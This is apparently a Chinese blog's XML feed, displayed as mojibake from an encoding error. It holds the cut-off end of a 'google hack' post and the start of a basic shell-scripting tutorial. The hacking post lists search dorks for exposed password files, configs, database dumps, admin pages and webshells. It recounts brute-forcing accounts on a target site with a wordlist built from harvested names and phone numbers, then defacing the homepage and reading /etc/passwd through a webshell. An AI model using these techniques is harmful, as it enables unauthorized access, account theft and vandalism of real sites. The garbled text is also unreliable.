¡çš„ç«™ç‚¹çš„å¯†ç éƒ½æ¯”è¾ƒæœ‰è§„å¾‹ï¼Œé€šå¸¸éƒ½æ˜¯åŸŸå+ç”µè¯ä¸€ç±»çš„å˜å½¢</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">site:xxxx<span class="selector-class">.com</span> <span class="comment">//å¾—åˆ°Nä¸ªäºŒçº§åŸŸå</span></span><br><span class="line"></span><br><span class="line">site:xxxx<span class="selector-class">.com</span> intext:@xxxx<span class="selector-class">.com</span> <span class="comment">//å¾—åˆ°Nä¸ªé‚®ä»¶åœ°å€ï¼Œè¿˜æœ‰é‚®ç®±çš„ä¸»äººçš„åå­—ä»€ä¹ˆçš„</span></span><br><span class="line"></span><br><span class="line">site:xxxx<span class="selector-class">.com</span> intext:ç”µè¯ <span class="comment">//Nä¸ªç”µè¯ </span></span><br></pre></td></tr></table></figure><p>æŠŠè¿™äº›ä¿¡æ¯åšä¸ªå­—å…¸ï¼ŒæŒ‚ä¸Šæ…¢æ…¢è·‘ã€‚è¿‡äº†ä¸€æ®µæ—¶é—´å°±è·‘å‡º4ä¸ªå¸å·ï¼Œ2ä¸ªæ˜¯å­¦ç”Ÿä¼šçš„ï¼Œ1ä¸ªç®¡ç†å‘˜ï¼Œè¿˜æœ‰ä¸€ä¸ªå¯èƒ½æ˜¯è€å¸ˆçš„å¸å·</p><p>google hackå…¶å®ä¹Ÿéƒ½å·®ä¸å¤šæ˜¯ä¸€äº›åŸºæœ¬è¯­æ³•çš„çµæ´»è¿ç”¨ï¼Œæˆ–è€…é…åˆæŸä¸ªè„šæœ¬æ¼æ´ï¼Œä¸»è¦è¿˜æ˜¯é ä¸ªäººçš„çµæ´»æ€ç»´</p><p>å¯¹äºä¸€äº›åœ¨winä¸Šè·‘ apacheçš„åº”è¯¥å¤šæ³¨æ„ä¸€ä¸‹è¿™æ–¹é¢ï¼Œä¸€ä¸ª<code>intitle:index of</code>å°±å·®ä¸å¤šéƒ½å‡ºæ¥äº† <code>echo â€œå¬å”¤â€ &gt; index.jsp</code> ç°åœ¨çœ‹çœ‹é¦–é¡µï¼Œå·²ç»è¢«æ”¹æˆ: â€œå¬å”¤â€ äº†ã€‚</p><p>ä¹Ÿå¯ä»¥ç”¨WGETä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ä¸Šå»ï¼Œç„¶å<code>execute Commandè¾“å…¥ cat file &gt; index.html or echo â€œâ€&gt; file echo â€œtestâ€ &gt;&gt; file</code> è¿™æ ·ä¸€æ¡æ¡æ‰“å‡ºæ¥ï¼Œç«™ç‚¹é¦–é¡µå°±æˆåŠŸè¢«æ›¿æ¢äº†</p><p>åŒæ ·çš„ä¹Ÿå¯ä»¥ <code>uname -a;cat /etc/passwd</code> ä¸è¿‡æœ‰ç‚¹è¦æ³¨æ„ï¼Œæœ‰äº›WEBSHELLç¨‹åºæœ‰é—®é¢˜ï¼Œæ‰§è¡Œä¸äº†çš„ï¼Œ</p><h4 id="æœç´¢INCæ•æ„Ÿä¿¡æ¯"><a href="#æœç´¢INCæ•æ„Ÿä¿¡æ¯" class="headerlink" title="æœç´¢INCæ•æ„Ÿä¿¡æ¯"></a>æœç´¢INCæ•æ„Ÿä¿¡æ¯</h4><p>åœ¨googleçš„æœç´¢æ¡†ä¸­å¡«å…¥: <code>Code: .org filetype:inc</code> </p><p>ä¾‹ï¼šå¸¸ç”¨çš„googleå…³é”®å­—ï¼š foo1 foo2 (ä¹Ÿå°±æ˜¯å…³è”ï¼Œæ¯”å¦‚æœç´¢xxå…¬å¸ xxç¾å¥³) </p><p><code>operator:foo filetype:123</code> ç±»å‹ </p><p><code>site:foo.com</code> ç›¸å¯¹ç›´æ¥çœ‹ç½‘ç«™æ›´æœ‰æ„æ€ï¼Œå¯ä»¥å¾—åˆ°è®¸å¤šæ„å¤–çš„ä¿¡æ¯ </p><p><code>intext:foo intitle: fooltitle</code> æ ‡é¢˜ <code>allinurl:foo</code> æœç´¢xxç½‘ç«™çš„æ‰€æœ‰ç›¸å…³è¿æ¥ã€‚ï¼ˆè¸©ç‚¹å¿…å¤‡ï¼‰ </p><p><code>links:foo </code>ä¸è¦è¯´å°±çŸ¥é“æ˜¯å®ƒçš„ç›¸å…³é“¾æ¥ </p><p><code>allintilte:foo.com</code> å¯ä»¥è¾…åŠ©<code>â€-â€ â€œ+â€</code>æ¥è°ƒæ•´æœç´¢çš„ç²¾ç¡®ç¨‹åº¦ ç›´æ¥æœç´¢å¯†ç ï¼š(å¼•å·è¡¨ç¤ºä¸ºç²¾ç¡®æœç´¢)</p><p>å¯ä»¥å†å»¶ä¼¸åˆ°ä¸Šé¢çš„ç»“æœé‡Œè¿›è¡ŒäºŒæ¬¡æœç´¢</p><p><code>â€œindex ofâ€ htpasswd / passwd filetype:xls username password email â€œws_ftp.logâ€ â€œconfig.phpâ€ allinurl:admin mdb service filetype:pwd</code></p><p>æˆ–è€…æŸä¸ªæ¯”å¦‚pcanywhereçš„å¯†ç åç¼€cifç­‰</p><p>å†æ¥ç‚¹æ›´æ•æ„Ÿä¿¡æ¯ <code>â€œrobots.txtâ€ â€œDisallow:â€ filetype:txt inurl:_vti_cnf</code> (FrontPageçš„å…³é”®ç´¢å¼•å•¦ï¼Œæ‰«æå™¨çš„CGIåº“ä¸€èˆ¬éƒ½æœ‰) </p><p><code>allinurl: /msadc/Samples/selector/showcode.asp /../../../passwd /examples/jsp/snp/snoop.jsp phpsysinfo intitle:index of /admin intitle:â€documetationâ€ inurl: 5800(vncçš„ç«¯å£)</code></p><p>æˆ–è€…desktop portç­‰å¤šä¸ªå…³é”®å­—æ£€ç´¢ <code>webmin port 10000 inurl:/admin/login.asp intext:ã€€Powered by GBook365 intitle:â€php shellâ€ â€œEnable stderrâ€ filetype:php</code> ç›´æ¥æœç´¢åˆ°phpwebshell</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">foo.org filetype:inc</span><br><span class="line"></span><br><span class="line">ipsec filetype:conf</span><br><span class="line"></span><br><span class="line">intilte:â€error occurredâ€ ODBC request <span class="keyword">where</span> (<span class="keyword">select</span>|<span class="keyword">insert</span>) è¯´ç™½äº†å°±æ˜¯è¯´ï¼Œå¯ä»¥ç›´æ¥è¯•ç€æŸ¥æŸ¥æ•°æ®åº“æ£€ç´¢ï¼Œé’ˆå¯¹ç›®å‰æµè¡Œçš„<span class="keyword">sql</span>æ³¨å°„</span><br><span class="line"></span><br><span class="line">â€œDumping data <span class="keyword">for</span> <span class="keyword">table</span>â€ username <span class="keyword">password</span></span><br><span class="line"></span><br><span class="line">intitle:â€Error <span class="keyword">using</span> Hypernewsâ€</span><br><span class="line"></span><br><span class="line">â€œ<span class="keyword">Server</span> Softwareâ€</span><br><span class="line"></span><br><span class="line">intitle:â€HTTP_USER_AGENT=Googlebotâ€</span><br><span class="line"></span><br><span class="line">â€œHTTP_USER_ANGET=Googlebotâ€ THS <span class="keyword">ADMIN</span></span><br><span class="line"></span><br><span class="line">filetype:.doc site:.mil classified ç›´æ¥æœç´¢å†›æ–¹ç›¸å…³word</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥å¤šä¸ªå…³é”®å­—ï¼š</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">intitle</span>:config confixx login password</span><br><span class="line"></span><br><span class="line">â€œmydomain.comâ€ nessus re<span class="keyword">port</span></span><br><span class="line"></span><br><span class="line">â€œre<span class="keyword">port</span> generated byâ€</span><br><span class="line"></span><br><span class="line">â€œipconfigâ€</span><br><span class="line"></span><br><span class="line">â€œwinipconfigâ€</span><br></pre></td></tr></table></figure><p>googleç¼“å­˜åˆ©ç”¨ï¼Œæœç´¢æ—¶å€™å¤šâ€é€‰æœç´¢æ‰€æœ‰ç½‘ç«™â€</p><p>ç‰¹åˆ«æ¨èï¼šadministrator users ç­‰ç›¸å…³çš„ä¸œè¥¿ï¼Œæ¯”å¦‚åå­—ï¼Œç”Ÿæ—¥ç­‰â€¦â€¦æœ€æƒ¨ä¹Ÿå¯ä»¥æ‹¿æ¥åšå­—å…¸</p><p>ä¸€äº›æŠ€å·§é›†åˆï¼š</p><ol><li><p>index.of.password</p></li><li><p>filetype:blt â€œbuddylistâ€</p></li><li><p>â€œaccess denied for userâ€ â€œusing passwordâ€</p></li><li><p>intitle:â€index ofâ€ inurl:ftp (pub | incoming)</p></li><li><p>â€œhttp://:@wwwâ€ domainname</p></li><li><p>filetype:cnf inurl:_vti_pvt access.cnf</p></li><li><p>auth_user_file.txt</p></li><li><p>allinurl:â€//_vti_pvt/â€ | allinurl:â€//_vti_cnf/â€</p></li><li><p>The Master List</p></li><li><p>inurl:â€install/install.phpâ€</p></li><li><p>allinurl: admin mdb</p></li><li><p>intitle:â€welcome.to.squeezeboxâ€</p></li><li><p>passlist.txt (a better way)</p></li><li><p>intext:â€â€BiTBOARD v2.0â€³ BiTSHiFTERS Bulletin Boardâ€</p></li><li><p>â€œA syntax error has occurredâ€ filetype:ihtml</p></li><li><p>intitle:ã€€Login intext:â€RT is ? Copyrightâ€</p></li><li><p>â€œ# -FrontPage-â€ inurl:service.pwd</p></li><li><p>ext:php program_listing intitle:MythWeb.Program.Listing</p></li><li><p>ORA-00921: unexpected end of SQL command</p></li><li><p>intitle:index.of abyss.conf</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> hacker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> google </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellç¼–ç¨‹åŸºç¡€</title>
      <link href="post/16363/"/>
      <url>post/16363/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>Shellçš„æ¦‚å¿µæ˜¯æºè‡ªUnixçš„å‘½ä»¤è§£é‡Šå™¨ã€‚Shellä¸ä»…å¯è§£é‡Šç”¨æˆ·è¾“å…¥çš„å‘½ä»¤ï¼ŒåŒæ—¶ï¼Œå¯è§£é‡Šæ‰§è¡ŒåŸºäºå‘½ä»¤çš„è„šæœ¬è¯­è¨€ã€‚ä½¿ç”¨shellè„šæœ¬èƒ½æé«˜ç”¨æˆ·æ“ä½œå’Œç®¡ç†å‘˜è¿›è¡Œç³»ç»Ÿç®¡ç†çš„æ•ˆç‡ã€‚shellè„šæœ¬æ“…é•¿å¤„ç†çº¯æ–‡æœ¬ç±»å‹çš„æ•°æ®ï¼Œè€ŒLinuxä¸­å‡ ä¹æ‰€æœ‰çš„é…ç½®æ–‡ä»¶ã€æ—¥å¿—éƒ½æ˜¯çº¯æ–‡æœ¬ç±»å‹ã€‚</p><span id="more"></span><h3 id="è„šæœ¬ä¹¦å†™è§„èŒƒ"><a href="#è„šæœ¬ä¹¦å†™è§„èŒƒ" class="headerlink" title="è„šæœ¬ä¹¦å†™è§„èŒƒ"></a>è„šæœ¬ä¹¦å†™è§„èŒƒ</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>è„šæœ¬ç»Ÿä¸€å­˜æ”¾ç›®å½•</span><br><span class="line"><span class="number">2.</span>é€‰æ‹©è§£é‡Šå™¨, å¼€å¤´è¦å†™#! XXX,å†…æ ¸æ ¹æ®#!åçš„è§£é‡Šå™¨æ¥ç¡®å®šç”¨å“ªä¸ªè§£é‡Šå™¨è§£é‡Šè„šæœ¬å†…å®¹</span><br><span class="line"><span class="number">3.</span>ç¼–è¾‘è„šæœ¬ä½¿ç”¨vim, é…ç½®~/.vimrcæ–¹ä¾¿ä¸ªäººä¹¦å†™ä¹ æƒ¯</span><br><span class="line"><span class="number">4.</span>æ–‡ä»¶åè§„èŒƒï¼Œç»“å°¾ä»¥shç»“æŸ</span><br></pre></td></tr></table></figure><h3 id="shellçš„åŸºæœ¬å…ƒç´ "><a href="#shellçš„åŸºæœ¬å…ƒç´ " class="headerlink" title="shellçš„åŸºæœ¬å…ƒç´ "></a>shellçš„åŸºæœ¬å…ƒç´ </h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>#ï¼/bin/bash å¿…é¡»çš„ï¼ŒæŒ‡å‡ºshellçš„ç±»å‹</span><br><span class="line"><span class="number">2.</span># æ³¨é‡Šã€‚åœ¨shellä¸­ï¼Œæ³¨é‡Šå†™åœ¨#ä¹‹åï¼Œ#ä¹‹åçš„å†…å®¹ä¸ä¼šæ‰§è¡Œ</span><br><span class="line"><span class="number">3.</span>å˜é‡</span><br><span class="line"><span class="number">4.</span>æ§åˆ¶ å¾ªç¯åˆ†æ”¯</span><br></pre></td></tr></table></figure><h3 id="shellä¸­çš„ç‰¹æ®Šç¬¦å·"><a href="#shellä¸­çš„ç‰¹æ®Šç¬¦å·" class="headerlink" title="shellä¸­çš„ç‰¹æ®Šç¬¦å·"></a>shellä¸­çš„ç‰¹æ®Šç¬¦å·</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="comment">#! æ³¨æ˜æ‰§è¡Œè„šæœ¬é‡‡ç”¨çš„shell</span></span><br><span class="line"><span class="number">2</span>.<span class="variable">$ </span>å˜é‡ç¬¦ã€‚</span><br><span class="line">ä¸åæ–œæ è½¬ä¹‰ç¬¦ç›¸åï¼Œä½¿å…¶åçš„æ™®é€šå­—ç¬¦ä½œä¸ºå˜é‡åï¼Œå¦‚<span class="variable">$a</span>è¡¨ç¤ºå˜é‡açš„å€¼ã€‚å˜é‡</span><br><span class="line">å­—ç¬¦é•¿åº¦è¶…è¿‡<span class="number">1</span>ä¸ªæ—¶ï¼Œç”¨&#123;&#125;æ‹¬èµ·æ¥</span><br><span class="line"><span class="number">3</span>.å•å¼•å·ã€‚</span><br><span class="line">è¢«å¼•èµ·çš„å­—ç¬¦å…¨éƒ¨åšæ™®é€šå­—ç¬¦ï¼Œå³å…¨éƒ¨åŸæ ·echo <span class="string">&#x27;my $SHELL&#x27;</span></span><br><span class="line"><span class="number">4</span>.åŒå¼•å·</span><br><span class="line">å¼•å·å†…çš„å†…å®¹ï¼Œé™¤<span class="variable">$ã€</span>è½¬ä¹‰ç¬¦\ã€å€’å¼•å·`è¿™ä¸‰ä¸ªä¿ç•™ç‰¹æ®ŠåŠŸèƒ½ï¼Œå…¶ä»–å­—ç¬¦å‡åšæ™®é€šå­—ç¬¦ã€‚</span><br><span class="line"><span class="number">5</span>.å€’å¼•å·(æ•°å­—<span class="number">1</span>é”®æ—è¾¹çš„é‚£ä¸ªé”®ï¼‰</span><br><span class="line">å¼•å·å†…çš„å­—ç¬¦ä¸²å½“åšshellå‘½ä»¤è¡Œè§£é‡Šæ‰§è¡Œï¼ˆåŒæ ·çš„åŠŸèƒ½ä¹Ÿå¯ä»¥ä½¿ç”¨<span class="variable">$(</span>)æ¥ä½¿ç”¨ï¼‰ï¼Œå¾—åˆ°çš„ç»“æœ</span><br><span class="line">å–ä»£æ•´ä¸ªå€’å¼•å·æ‹¬èµ·æ¥çš„éƒ¨åˆ†ã€‚</span><br><span class="line"><span class="number">6</span>.åæ–œçº¿</span><br><span class="line">åæ–œçº¿æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œå®ƒèƒ½æŠŠç‰¹æ®Šå­—ç¬¦å˜æˆæ™®é€šå­—ç¬¦ã€‚åœ¨æŸä¸ªå­—ç¬¦å‰é¢åˆ©ç”¨åæ–œæ ï¼ˆ\ï¼‰èƒ½å¤Ÿé˜»æ­¢</span><br><span class="line">shellæŠŠåé¢çš„å­—ç¬¦è§£é‡Šä¸ºç‰¹æ®Šå­—ç¬¦ã€‚</span><br><span class="line"><span class="number">7</span>.*  ä»£è¡¨0ä¸ªæˆ–è€…å¤šä¸ªç‰¹æ®Šå­—ç¬¦</span><br><span class="line">ä¾‹å­ yum.* ä»£è¡¨çš„å¯ä»¥ä½¿yum.ä¹Ÿå¯ä»¥æ˜¯yum.aã€yum.abã€yum.abc å½“ç„¶å°æ•°ç‚¹åé¢å¯ä»¥æœ‰å¤šä¸ªå­—æ¯</span><br><span class="line"><span class="number">8</span>.? ä»£è¡¨çš„æ˜¯ä»»æ„ä¸€ä¸ªå­—ç¬¦</span><br><span class="line">ä¾‹å­ yum.? å¯ä»¥æ˜¯yum.a yum.b yum.cï¼Œä½†æ˜¯è¦æ³¨æ„å°æ•°ç‚¹åé¢å¿…é¡»æœ‰ä»»æ„ä¸€ä¸ªå­—ç¬¦</span><br><span class="line"><span class="number">9</span>.[]</span><br><span class="line">ä»£è¡¨çš„æ˜¯ä¸­æ‹¬å·ä¸­çš„ä»»æ„ä¸€ä¸ª</span><br><span class="line">[abcdef] å¯ä»¥æ˜¯a b c d e f ä¸­çš„ä»»æ„ä¸€ä¸ªå­—æ¯å½“ç„¶ä¹Ÿå¯ä»¥æ˜¯æ•°å­—</span><br><span class="line">[-]ä»£è¡¨çš„æ˜¯ä¸€ä¸ªèŒƒå›´</span><br><span class="line">[a-z] è¡¨ç¤ºçš„æ˜¯å­—æ¯aåˆ°zä¹‹é—´çš„æ‰€æœ‰å­—æ¯</span><br><span class="line">[^]^æ˜¯åå‘é€‰æ‹©ç¬¦å·ä»å­—é¢æ„æ€å¯ä»¥çŸ¥é“ä¹Ÿå°±æ˜¯éçš„æ„æ€</span><br><span class="line">[^abc]è¡¨ç¤ºåªè¦ä¸a b c è¿™ä¸‰ä¸ªå­—ç¬¦ä¸­çš„ä»»æ„ä¸€ä¸ªå°±é€‰æ‹©</span><br><span class="line"><span class="number">10</span>.<span class="variable">$(</span> )</span><br><span class="line">å¯ä»¥å°†å‘½ä»¤æ›¿æ¢è¾“å‡ºèµ‹å€¼ç»™å˜é‡</span><br><span class="line"><span class="number">11</span>.&#123;&#125;</span><br><span class="line">é€šè¿‡æ‹¬å·æ‰©å±•å¯ä»¥ç”Ÿæˆéœ€è¦çš„å­—ä¸²ï¼Œæ‹¬å·ä¸­å¯ä»¥åŒ…å«è¿ç»­çš„åºåˆ—æˆ–ä½¿ç”¨é€—å·åˆ†éš”çš„å¤šä¸ªé¡¹ç›®ï¼Œè¿ç»­çš„åºåˆ—åŒ…æ‹¬ä¸€ä¸ªèµ·ç‚¹å’Œä¸€ä¸ªç»ˆç‚¹</span><br><span class="line">user<span class="variable">@computer</span>: ~<span class="variable">$ </span>echo &#123;a,b,c&#125;</span><br><span class="line"> a b c</span><br><span class="line">user<span class="variable">@computer</span>: ~<span class="variable">$ </span>echo user&#123;<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>&#125;</span><br><span class="line">user1 user5 user8</span><br><span class="line">user<span class="variable">@computer</span>: ~<span class="variable">$ </span>echo &#123;0..<span class="number">10</span>&#125;</span><br><span class="line">0 <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span> <span class="number">10</span></span><br><span class="line">user<span class="variable">@computer</span>: ~<span class="variable">$ </span>mkdir &#123;dir1,dir2,dir3&#125;</span><br><span class="line">user<span class="variable">@computer</span>: ~<span class="variable">$ </span>ls â€“ld dir&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h3><p>shellå˜é‡å¯ä»¥ä¿å­˜è·¯å¾„åã€æ–‡ä»¶åæˆ–è€…ä¸€ä¸ªæ•°å­—ç­‰ã€‚åˆ†ä¸ºä¸‰ç±»ï¼š</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">æœ¬åœ°å˜é‡: (å±€éƒ¨å˜é‡)åªåœ¨åˆ›å»ºå®ƒä»¬çš„<span class="built_in">Shell</span>ä¸­ä½¿ç”¨ï¼Œå¯ä»¥åœ¨<span class="built_in">shell</span>ç¨‹åºå†…ä»»æ„ä½¿ç”¨å’Œä¿®æ”¹å®ƒ</span><br><span class="line">ä»¬ã€‚</span><br><span class="line">ç¯å¢ƒå˜é‡: å¯ä»¥åœ¨åˆ›å»ºå®ƒä»¬çš„<span class="built_in">Shell</span>åŠå…¶æ´¾ç”Ÿå‡ºæ¥çš„ä»»æ„å­ç¨‹åºä¸­ä½¿ç”¨ã€‚æœ‰äº›å˜é‡æ˜¯ç”¨æˆ·åˆ›å»º</span><br><span class="line">çš„ï¼Œå…¶ä»–çš„åˆ™æ˜¯ä¸“ç”¨çš„ï¼ˆæ¯”å¦‚PATHã€HOME)ã€‚æ˜¯ç³»ç»Ÿç¯å¢ƒçš„ä¸€éƒ¨åˆ†ï¼Œä¸å¿…å»å®šä¹‰å®ƒä»¬ï¼Œå¯ä»¥åœ¨</span><br><span class="line"><span class="built_in">shell</span>ç¨‹åºä¸­ä½¿ç”¨å®ƒä»¬ ã€‚è¿˜èƒ½åœ¨<span class="built_in">shell</span>ä¸­åŠ ä»¥ä¿®æ”¹ã€‚</span><br><span class="line">å†…éƒ¨å˜é‡: ç”±ç³»ç»Ÿæä¾›çš„ã€‚ä¸ç¯å¢ƒå˜é‡ä¸åŒï¼Œç”¨æˆ·ä¸èƒ½ä¿®æ”¹å®ƒä»¬ã€‚</span><br></pre></td></tr></table></figure><h4 id="æœ¬åœ°å˜é‡"><a href="#æœ¬åœ°å˜é‡" class="headerlink" title="æœ¬åœ°å˜é‡"></a>æœ¬åœ°å˜é‡</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">æœ¬åœ°å˜é‡ åœ¨ç”¨æˆ·ç°åœ¨çš„shellç”Ÿå‘½æœŸçš„è„šæœ¬ä¸­ä½¿ç”¨</span><br><span class="line"> å˜é‡å=å€¼</span><br><span class="line"><span class="number">1</span>.ç­‰å·ä¸¤è¾¹ä¸å¯ä»¥æœ‰ç©ºæ ¼</span><br><span class="line"><span class="number">2</span>.å–å€¼åŒ…å«ç©ºæ ¼ï¼Œå¿…é¡»ç”¨åŒå¼•å·æ‹¬èµ·æ¥</span><br><span class="line"><span class="number">3</span>.Shellå˜é‡å¯ä»¥ç”¨å¤§å°å†™å­—æ¯ï¼ŒåŒºåˆ†å¤§å°å†™</span><br><span class="line"></span><br><span class="line">å˜é‡æ˜¯å¼±ç±»å‹çš„, ä¸ç”¨å£°æ˜ç±»å‹</span><br><span class="line"></span><br><span class="line"><span class="comment"># å˜é‡å£°æ˜åŠèµ‹å€¼æ ¼å¼</span></span><br><span class="line">å˜é‡=å€¼ï¼ˆç­‰å·ä¸¤è¾¹ä¸èƒ½æœ‰ç©ºæ ¼ï¼‰</span><br><span class="line"></span><br><span class="line"><span class="comment"># å˜é‡çš„å¼•ç”¨</span></span><br><span class="line"> <span class="variable">$å˜</span>é‡å</span><br><span class="line"> <span class="variable">$&#123;</span>å˜é‡å&#125;</span><br><span class="line"> å˜é‡åä¸º<span class="number">1</span>ä¸ªå­—ç¬¦æ—¶å»ºè®®ä½¿ç”¨æ–¹å¼ä¸€ï¼Œå¤šä½™ä¸€ä¸ªå­—ç¬¦æ—¶å»ºè®®ä½¿ç”¨æ–¹å¼äºŒ</span><br><span class="line"> ä¸¾ä¾‹: <span class="variable">$a</span> <span class="variable">$&#123;</span>abc&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¸…é™¤å˜é‡</span></span><br><span class="line">unset å˜é‡å</span><br><span class="line">user<span class="variable">@computer</span>: ~<span class="variable">$ </span>name=Jack</span><br><span class="line">user<span class="variable">@computer</span>: ~<span class="variable">$ </span>echo <span class="variable">$&#123;</span>name&#125;</span><br><span class="line">user<span class="variable">@computer</span>: ~<span class="variable">$ </span>unset name  <span class="comment"># æ³¨æ„,nameå‰æ²¡æœ‰$</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®åªè¯»å˜é‡</span></span><br><span class="line">è®¾ç½®å˜é‡æ—¶ï¼Œä¸æƒ³å†æ”¹å˜å…¶å€¼ï¼Œå¯ä»¥å°†ä¹‹è®¾ä¸ºåªè¯»å˜é‡</span><br><span class="line"> å˜é‡å=å€¼</span><br><span class="line"> readonly  å˜é‡å</span><br></pre></td></tr></table></figure><h4 id="ç¯å¢ƒå˜é‡"><a href="#ç¯å¢ƒå˜é‡" class="headerlink" title="ç¯å¢ƒå˜é‡"></a>ç¯å¢ƒå˜é‡</h4><p>Bashé¢„è®¾äº†å¾ˆå¤šç¯å¢ƒå˜é‡ï¼Œå®é™…ä½¿ç”¨ä¸­ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨è¿™äº›å˜é‡ã€‚ç¯å¢ƒå˜é‡å¯ä»¥ç”¨äºæ‰€æœ‰å­ç¨‹åºï¼Œç€åŒ…æ‹¬ç¼–è¾‘å™¨ã€è„šæœ¬å’Œåº”ç”¨</p><p>å†…ç½®ç¯å¢ƒå˜é‡</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">HOME:</span> ä»£è¡¨ä½¿ç”¨è€…çš„å®¶ç›®å½•ã€‚cd ~ å»åˆ°ä½¿ç”¨è€…çš„å®¶ç›®å½• æˆ–è€…åˆ©ç”¨ cd å°±å¯ä»¥ç›´æ¥å›åˆ°ä½¿ç”¨è€…</span><br><span class="line">å®¶ç›®å½•äº†ã€‚</span><br><span class="line"><span class="symbol">SHELL:</span> ç›®å‰è¿™ä¸ªç¯å¢ƒä½¿ç”¨çš„ SHELL æ˜¯å“ªä¸ªç¨‹åºï¼Ÿ å¦‚æœæ˜¯ bash çš„è¯ï¼Œé¢„è®¾æ˜¯ <span class="meta-keyword">/bin/</span>bash</span><br><span class="line">PWDï¼šç”¨æˆ·å½“å‰å·¥ä½œç›®å½•çš„è·¯å¾„ã€‚å®ƒæŒ‡å‡ºç”¨æˆ·ç›®å‰åœ¨Linuxæ–‡ä»¶ç³»ç»Ÿä¸­å¤„åœ¨ä»€ä¹ˆä½ç½®ã€‚å®ƒæ˜¯ç”±</span><br><span class="line">Linuxè‡ªåŠ¨è®¾ç½®çš„</span><br><span class="line"><span class="symbol">HISTSIZE:</span> è¿™ä¸ªä¸â€œå†å²å‘½ä»¤â€æœ‰å…³ï¼Œæ›¾ç»ä¸‹è¾¾è¿‡çš„æŒ‡ä»¤å¯ä»¥è¢«ç³»ç»Ÿè®°å½•ä¸‹æ¥ï¼Œè€Œè®°å½•çš„â€œæ•°ç›®â€</span><br><span class="line">åˆ™æ˜¯ç”±è¿™ä¸ªå€¼æ¥è®¾å®šçš„ã€‚</span><br><span class="line"><span class="symbol">PATH:</span> å°±æ˜¯æ‰§è¡Œæ–‡ä»¶æœå¯»çš„è·¯å¾„ï¼Œç›®å½•ä¸ç›®å½•ä¸­é—´ä»¥å†’å·(:)åˆ†éš”ï¼Œ ç”±äºæ–‡ä»¶çš„æœå¯»æ˜¯ä¾åºç”±</span><br><span 